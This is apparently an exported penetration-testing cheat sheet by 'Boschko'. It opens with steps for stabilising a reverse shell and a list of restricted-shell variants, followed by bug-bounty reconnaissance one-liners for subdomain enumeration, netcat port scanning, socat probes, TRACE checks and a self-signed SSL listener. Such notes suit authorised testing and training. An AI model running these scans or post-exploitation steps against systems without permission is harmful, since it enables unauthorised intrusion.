<pre id="bkmrk-%24-stty-raw--echo-%24-f"><code class="language-">$ stty raw -echo
$ fg
press enter</code></pre>
<h4 id="bkmrk-in-reverse-shell-0"><strong>In Reverse Shell</strong></h4>
<pre id="bkmrk-%24-reset-%24-export-she"><code class="language-">$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows &lt;num&gt; columns &lt;cols&gt;</code></pre>
<pre id="bkmrk-sh--r-rsh-rbash-bash"><code class="language-">sh -r 
rsh

rbash
bash -r
bash --restricted

rksh
ksh -r</code></pre>
<p id="bkmrk-%C2%A0-0"> </p>
<p id="bkmrk-%C2%A0-1"> </p>
<p id="bkmrk-%C2%A0-2"> </p>
        
            <div class="page-break"></div>
        <h1 id="page-78">Bug Bounty</h1>

                    <p id="bkmrk-obtain-subdomains-an">Obtain subdomains and links from the target host:</p>
<pre id="bkmrk-for-h-in-%24%28cat-hosts"><code class="language-bash">for h in $(cat hosts.txt); do curl -siL https://$h|egrep -io "[0-9a-z_\-\.]+\.([0-9a-z_\-]+)?`echo $h|awk -F '.' '{print $(NF-1)}'`([0-9a-z_\-\.]+)?\.[a-z]{1,5}"|sort -fu ; done</code></pre>
<p id="bkmrk-obtain-subdomain-and">Obtain subdomain and V-host enumeration:</p>
<pre id="bkmrk-gobuster-dns--r-8.8."><code class="language-bash">gobuster dns -r 8.8.8.8 --wildcard -d targetdomain.com -t 50 -c -i -w ~/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -z -q &gt; tmp.txt &amp;&amp; cat tmp.txt | cut -d' ' -f2 | sort -u &gt; subs.txt &amp;&amp; cat tmp.txt | cut -d' ' -f3 | tr -d '[]' | sort -u -V &gt; hosts.txt</code></pre>
<p id="bkmrk-obtain-subdomains-us">Obtain subdomains using Crt.sh:</p>
<pre id="bkmrk-curl--s-https%3A%2F%2Fdns."><code class="language-bash">curl -s https://dns.bufferover.run/dns?q=.targetdomain.com |jq -r .FDNS_A[]|cut -d',' -f2|sort -u</code></pre>
<p id="bkmrk-obtain-subdomains-us-0">Obtain subdomains using WebArchive:</p>
<pre id="bkmrk-curl--s-%22http%3A%2F%2Fweb."><code class="language-bash">curl -s "http://web.archive.org/cdx/search/cdx?url=*.targetdomain.com/*&amp;output=text&amp;fl=original&amp;collapse=urlkey" |sort| sed -e 's_https*://__' -e "s/\/.*//" -e 's/:.*//' -e 's/^www\.//' | uniq</code></pre>
<p id="bkmrk-obtain-subdomains-us-1">Obtain subdomains using Hackertarget:</p>
<pre id="bkmrk-curl-https%3A%2F%2Fapi.hac"><code class="language-bash">curl https://api.hackertarget.com/hostsearch/?q=targetdomain.com | grep -o '\w.*targetdomain.com'</code></pre>
<p id="bkmrk-enumerate-hosts-from">Enumerate hosts from SSL certificates:</p>
<pre id="bkmrk-echo-%7C-openssl-s_cli"><code class="language-bash">echo | openssl s_client -connect https://targetdomain.com:443 | openssl x509 -noout -text | grep DNS</code></pre>
<p id="bkmrk-finding-site-endpoin">Finding site endpoints using CommonCrawl:</p>
<pre id="bkmrk-echo-%22targetdomain.c"><code class="language-bash">echo "targetdomain.com" | xargs -I domain curl -s "http://index.commoncrawl.org/CC-MAIN-2018-22-index?url=*.domain&amp;output=json" | jq -r .url | sort -u</code></pre>
<p id="bkmrk-grab-titles-of-webpa">Grab titles of webpages:</p>
<pre id="bkmrk-for-i-in-%24%28cat-webse"><code class="language-bash">for i in $(cat Webservers.txt ); do echo "$i | $(curl --connect-timeout 0.5 $i -so - | grep -iPo '(?&lt;=&lt;title&gt;)(.*)(?=&lt;/title&gt;)')"; done </code></pre>
<p id="bkmrk-netcat-scanner-for-h">netcat scanner for HTTP servers:</p>
<pre id="bkmrk-for-i-in-%24%28seq-1-255"><code class="language-bash">for i in $(seq 1 255); do nc -n -v -z "192.168.1.$i" 80 | grep "open"; done | tee webservers.txt</code></pre>
<p id="bkmrk-manually-perform-a-h">Manually perform a HTTP request:</p>
<pre id="bkmrk-%23-manually-perform-a"><code class="language-bash"> # Manually perform a HTTP Get Request
echo -ne "GET / HTTP/1.0\n\n" | nc www.redspin.com 80

# Manually perform a HTTP Get Request on a SSL Port
echo -ne "GET / HTTP/1.0\n\n" | socat – OPENSSL:www.website.com:443,verify=0</code></pre>
<p id="bkmrk-create-a-local-tcp-p">Create a local TCP pipe to a remote SSL port (to allow netcat to probe a SSL service):</p>
<pre id="bkmrk-socat--vd-tcp-listen"><code class="language-bash">socat -vd TCP-LISTEN:8888,fork OPENSSL:www.redspin.com:443,verify=0</code></pre>
<p id="bkmrk-perform-a-check-on-a">Perform a check on a list of webservers (HTTP or HTTPS): HOST:PORT -&gt; HOST:PORT | WEB SERVER | HTML Title:</p>
<pre id="bkmrk-cat-webservers.txt-%7C"><code class="language-bash">cat webservers.txt | xargs -P10 -I'{}' bash -c '(curl -Liks -m2 "https://{}" || curl -Liks -m2 "{}") | grep -iao -e "^Server: .*" -e "" | sed "s#Server: \(.*\)#|\1|#i;s###ig" | tr -d "\r\n" | sed "1s/^/{}/;\$a\\" | sed "s/^\([^|]*\)|$/\1||/"' | tee webserver_info.txt</code></pre>
<h4 id="bkmrk-check-if-trace-is-en">Check if Trace is enabled on a given website:</h4>
<pre id="bkmrk-echo--ne-%22trace-%2Fsom"><code class="language-bash">echo -ne "TRACE /something HTTP/1.0\nX-Header: Trace Enabled\n\n" | socat - OPENSSL:www.website.com:443,verify=0</code></pre>
<h4 id="bkmrk-simple-https-%28ssl%29-l">Simple HTTPS (SSL) Listener with a bad self-signed server certificate:</h4>
<pre id="bkmrk-echo--ne-%22%5Cn%5Cn%5Cn%5Cn%5Cn"><code class="language-bash">echo -ne "\n\n\n\n\n\n\n" | openssl req -new -newkey rsa:1024 -days 1 -nodes -x509 -keyout out.pem -out out.pem ; openssl s_server -cert out.pem -www</code></pre>
<h4 id="bkmrk-printing-ip-addresse">Printing IP addresses of scope + some magic:</h4>
<pre id="bkmrk-%23-sort-by-ip-address"><code class="language-bash"># Sort by IP Addresses
sort -n -t. -k1,1 -k2,2 -k3,3 -k4,4

# Print IP addresses in a file
egrep -o '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}'

#Print IP address in all files in the current directory tree with some pretty color matching
find . -type f -exec egrep -a -H -n --color=auto '[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}\.[[:digit:]]{1,3}' {} \;</code></pre>
<p id="bkmrk-%C2%A0-1"> </p>
<p id="bkmrk-%C2%A0-2"> </p>
<p id="bkmrk-%C2%A0-3"> </p>
<hr id="bkmrk-"><h4 id="bkmrk-by-boschko">By Boschko</h4>
<ul id="bkmrk-my-hack-the-box%3A-htt"><li class="graf graf--p">My Hack The Box: <a class="markup--anchor markup--p-anchor" href="https://www.hackthebox.eu/home/users/profile/37879" target="_blank" rel="nofollow noopener" data-href="https://www.hackthebox.eu/home/users/profile/37879">https://www.hackthebox.eu/home/users/profile/37879</a></li>
<li class="graf graf--p">My Website: <a class="markup--anchor markup--p-anchor" href="https://olivierlaflamme.github.io/" target="_blank" rel="noopener nofollow noopener" data-href="https://olivierlaflamme.github.io/">https://olivierlaflamme.github.io/</a></li>
<li class="graf graf--p">My GitHub: <a class="markup--anchor markup--p-anchor" href="https://github.com/OlivierLaflamme" target="_blank" rel="noopener nofollow noopener" data-href="https://github.com/OlivierLaflamme">https://github.com/OlivierLaflamme</a></li>
<li class="graf graf--p">My WeChat QR below:</li>
</ul><figure id="bkmrk--15" class="graf graf--figure graf--layoutOutsetLeft"><img class="graf-image" src="https://cdn-images-1.medium.com/max/750/0*Jh0zrZrfyn8WjkDn.png" data-image-id="0*Jh0zrZrfyn8WjkDn.png" data-width="142" data-height="144"></figure><p id="bkmrk-%C2%A0-4"> </p>
        
    </div>
</body>
</html>